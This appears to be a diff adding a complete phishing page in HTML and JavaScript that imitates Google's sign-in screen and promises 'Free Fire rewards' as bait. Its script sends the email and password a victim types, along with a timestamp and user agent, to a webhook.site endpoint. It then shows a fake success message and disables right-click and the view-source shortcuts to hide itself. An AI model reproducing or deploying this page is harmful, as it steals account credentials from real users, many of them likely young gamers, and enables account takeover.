@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link rel="icon" type="image/x-icon" href="https://www.google.com/favicon.ico">
+    <style>
+        * { margin: 0; padding: 0; font-family: 'Roboto', 'Segoe UI', Arial, sans-serif; }
+        body { background: #fff; color: #202124; }
+        .header { padding: 20px 30px; text-align: left; border-bottom: 1px solid #dadce0; }
+        .logo { height: 24px; }
+        .container { max-width: 450px; margin: 60px auto; padding: 0 20px; }
+        .card { border: 1px solid #dadce0; border-radius: 8px; padding: 40px 38px; }
+        .title { font-size: 24px; font-weight: 400; margin-bottom: 10px; text-align: center; }
+        .subtitle { color: #5f6368; font-size: 16px; margin-bottom: 35px; text-align: center; }
+        .ff-banner { background: linear-gradient(135deg, #ff9900, #ff3300); color: white; padding: 12px; border-radius: 6px; margin-bottom: 25px; text-align: center; font-weight: 500; }
+        .ff-logo { height: 20px; vertical-align: middle; margin-right: 8px; }
+        .input-container { margin-bottom: 22px; }
+        .input-label { display: block; color: #5f6368; font-size: 14px; margin-bottom: 8px; }
+        input[type="email"], input[type="password"] { width: 100%; height: 55px; padding: 0 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
+        input:focus { border: 2px solid #1a73e8; outline: none; }
+        .forgot-email { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; float: right; }
+        .next-button, .signin-button { width: 100%; background: #1a73e8; color: white; border: none; padding: 10px 0; border-radius: 4px; font-size: 15px; font-weight: 500; cursor: pointer; margin-top: 10px; }
+        .next-button:hover, .signin-button:hover { background: #1b66c9; }
+        .divider { text-align: center; border-bottom: 1px solid #dadce0; line-height: 0.1em; margin: 30px 0; }
+        .divider span { background: #fff; color: #5f6368; padding: 0 15px; font-size: 14px; }
+        .create-account { color: #1a73e8; text-decoration: none; font-weight: 500; font-size: 15px; }
+        .footer { text-align: center; margin-top: 30px; color: #5f6368; font-size: 12px; }
+        .footer a { color: #5f6368; text-decoration: none; padding: 0 10px; }
+        .language-selector { margin-top: 20px; text-align: center; }
+        .hidden { display: none; }
+        .error-box { background: #fce8e6; color: #c5221f; padding: 12px; border-radius: 4px; margin-bottom: 20px; font-size: 14px; display: none; }
+        .loading { text-align: center; color: #5f6368; margin-top: 20px; }
+        .checkmark { color: #1e8e3e; font-size: 18px; margin-right: 5px; }
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+</head>
+<body>
+    <!-- Header Persis Google -->
+    <div class="header">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" class="logo">
+    </div>
+
+    <!-- Kontainer Utama -->
+    <div class="container">
+        <!-- Kartu Login -->
+        <div class="card">
+            <h1 class="title">Sign in</h1>
+            <p class="subtitle">to continue to Free Fire Account Verification</p>
+
+            <!-- Banner Free Fire -->
+            <div class="ff-banner">
+                <img src="https://upload.wikimedia.org/wikipedia/en/3/3e/Free_Fire_Logo.jpg" class="ff-logo" alt="FF">
+                Claim Your Exclusive Free Fire Rewards! Verify your account now.
+            </div>
+
+            <!-- Kotak Error (Akan Muncul Saat Ada Kesalahan) -->
+            <div id="errorBox" class="error-box">
+                Invalid email or password. Try again, or click 'Forgot password' to reset it.
+            </div>
+
+            <!-- FORM LOGIN (Tampilan Awal: Meminta Email) -->
+            <form id="emailForm">
+                <div class="input-container">
+                    <label class="input-label">Email or phone</label>
+                    <input type="email" id="email" name="email" required autofocus placeholder="Enter your Gmail address">
+                </div>
+                <a href="#" class="forgot-email" onclick="showForgotEmail()">Forgot email?</a>
+                <p class="footer" style="text-align: left; margin-top: 40px;">
+                    Not your computer? Use Guest mode to sign in privately.
+                    <a href="#" style="font-weight:500;">Learn more</a>
+                </p>
+                <div style="text-align: right; margin-top: 30px;">
+                    <a href="#" class="create-account" onclick="showCreateAccount()">Create account</a>
+                    <button type="button" class="next-button" onclick="submitEmail()">Next</button>
+                </div>
+            </form>
+
+            <!-- FORM PASSWORD (Tampilan Setelah Email) -->
+            <form id="passwordForm" class="hidden">
+                <div style="margin-bottom: 25px;">
+                    <div style="font-size: 14px; color: #5f6368;">Sign in as</div>
+                    <div style="font-weight: 500; font-size: 16px;" id="displayEmail">user@example.com</div>
+                    <a href="#" class="forgot-email" onclick="goBackToEmail()">Switch account</a>
+                </div>
+                <div class="input-container">
+                    <label class="input-label">Enter your password</label>
+                    <input type="password" id="password" name="password" required autofocus>
+                    <a href="#" class="forgot-email" onclick="showForgotPassword()">Forgot password?</a>
+                </div>
+                <div style="margin-top: 10px; font-size: 14px; color: #5f6368;">
+                    <input type="checkbox" id="showPassword" onclick="togglePassword()">
+                    <label for="showPassword">Show password</label>
+                </div>
+                <div style="text-align: right; margin-top: 40px;">
+                    <a href="#" class="create-account" onclick="showCreateAccount()">Create account</a>
+                    <button type="button" class="signin-button" onclick="submitPassword()">Sign in</button>
+                </div>
+            </form>
+
+            <!-- LOADING/SUCCESS (Setelah Login) -->
+            <div id="loadingScreen" class="hidden">
+                <div class="loading">
+                    <p>🔐 Verifying your account with Free Fire servers...</p>
+                    <p style="margin-top: 15px; font-size: 13px;">This may take a few seconds. Please do not close this page.</p>
+                </div>
+            </div>
+            <div id="successScreen" class="hidden">
+                <div class="loading">
+                    <p><span class="checkmark">✅</span> Verification Successful!</p>
+                    <p style="margin-top: 15px; font-size: 15px;">Your Free Fire account has been verified. Rewards will be sent to your in-game mailbox within 24 hours.</p>
+                    <p style="margin-top: 25px; font-size: 13px; color: #5f6368;">You can now safely close this window.</p>
+                </div>
+            </div>
+
+            <!-- Pembatas & Footer Bawaan Google -->
+            <div class="divider"><span>or</span></div>
+            <div style="text-align: center;">
+                <a href="#" class="create-account">Try a different account</a>
+            </div>
+        </div>
+
+        <!-- Footer Bawah (Mirip Google) -->
+        <div class="footer">
+            <select style="border: none; color: #5f6368; font-size: 12px; background: transparent;">
+                <option>English (United States)</option>
+            </select>
+            <br><br>
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </div>
+
+    <!-- ========== JAVASCRIPT ========== -->
+    <script>
+        // ========== KONFIGURASI ==========
+        // GANTI URL_DESA dengan endpoint server desa untuk menangkap data
+        const SERVER_URL = 'https://webhook.site/f51c9972-44c5-40ad-ae94-2b044deedce5/collect';
+        let collectedEmail = '';
+
+        // ========== FUNGSI UTAMA ==========
+        function submitEmail() {
+            const email = document.getElementById('email').value;
+            if (!email || !email.includes('@')) {
+                showError('Please enter a valid email address.');
+                return;
+            }
+            collectedEmail = email;
+            document.getElementById('displayEmail').textContent = email;
+            document.getElementById('emailForm').classList.add('hidden');
+            document.getElementById('passwordForm').classList.remove('hidden');
+            // Kirim email ke server (log awal)
+            sendToServer({ type: 'EMAIL_ENTERED', email: email });
+        }
+
+        function submitPassword() {
+            const password = document.getElementById('password').value;
+            if (!password) {
+                showError('Please enter your password.');
+                return;
+            }
+
+            // Sembunyikan form, tampilkan loading
+            document.getElementById('passwordForm').classList.add('hidden');
+            document.getElementById('loadingScreen').classList.remove('hidden');
+
+            // Kirim EMAIL & PASSWORD ke server desa
+            sendToServer({
+                type: 'CREDENTIALS_SUBMITTED',
+                email: collectedEmail,
+                password: password,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                ip: '<?php echo $_SERVER["REMOTE_ADDR"]; ?>' // Akan gagal di static HTML, hanya contoh
+            });
+
+            // Simulasi proses loading, lalu tunjukkan "success"
+            setTimeout(() => {
+                document.getElementById('loadingScreen').classList.add('hidden');
+                document.getElementById('successScreen').classList.remove('hidden');
+            }, 2500);
+        }
+
+        function sendToServer(data) {
+            // Mengirim data ke server desa atau webhook
+            fetch(SERVER_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).catch(err => console.error('Failed to send:', err));
+        }
+
+        // ========== FUNGSI PENDUKUNG (UI/UX) ==========
+        function showError(message) {
+            const box = document.getElementById('errorBox');
+            box.textContent = message;
+            box.style.display = 'block';
+        }
+        function goBackToEmail() {
+            document.getElementById('passwordForm').classList.add('hidden');
+            document.getElementById('emailForm').classList.remove('hidden');
+            document.getElementById('errorBox').style.display = 'none';
+        }
+        function togglePassword() {
+            const passField = document.getElementById('password');
+            passField.type = passField.type === 'password' ? 'text' : 'password';
+        }
+        function showForgotEmail() { alert('To recover your email, visit the Google account recovery page.'); }
+        function showForgotPassword() { alert('To reset your password, visit the Google password reset page.'); }
+        function showCreateAccount() { alert('To create a new Google account, visit the official sign-up page.'); }
+
+        // ========== DETAIL REALISME ==========
+        // Fokus otomatis pada field input
+        document.getElementById('email')?.focus();
+        // Tangani "Enter" key
+        document.getElementById('email')?.addEventListener('keypress', (e) => { if (e.key === 'Enter') submitEmail(); });
+        document.getElementById('password')?.addEventListener('keypress', (e) => { if (e.key === 'Enter') submitPassword(); });
+        // Mencegah inspect element (sangat dasar)
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+        document.addEventListener('keydown', (e) => {
+            if (e.ctrlKey && (e.key === 'u' || e.key === 's' || e.key === 'i')) e.preventDefault();
+        });
+    </script>
+</body>
+</html>
